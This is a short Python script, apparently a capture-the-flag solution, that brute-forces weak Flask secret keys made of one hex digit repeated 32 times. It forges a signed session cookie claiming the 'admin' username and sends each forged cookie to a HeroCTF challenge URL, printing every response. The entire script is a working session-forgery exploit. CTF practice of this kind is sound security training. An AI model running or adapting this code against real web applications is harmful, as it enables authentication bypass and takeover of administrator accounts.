from flask.sessions import SecureCookieSessionInterface
import requests
from string import hexdigits
import ast


class MockApp(object):
    def __init__(self, secret_key):
        self.secret_key = secret_key

def encode( secret_key, session_cookie_structure):
        """ Encode a Flask session cookie """
        try:
            app = MockApp(secret_key)

            session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))
            si = SecureCookieSessionInterface()
            s = si.get_signing_serializer(app)

            return s.dumps(session_cookie_structure)
        except Exception as e:
            return "[Encoding error] {}".format(e)
            raise e

payload = '{"username": "admin"}'
url = "https://smallbigmistake.web.heroctf.fr/"
secretAlphavite = hexdigits

for signature in secretAlphavite:
    secret_key = signature * 32

    newCookies = encode(secret_key, payload)
    print("Try secret ", secret_key, "with cookies: ", newCookies)
    r = requests.get(url, cookies = {"session": newCookies})

    print(r.text)
    print("---------------------END-----------------------")
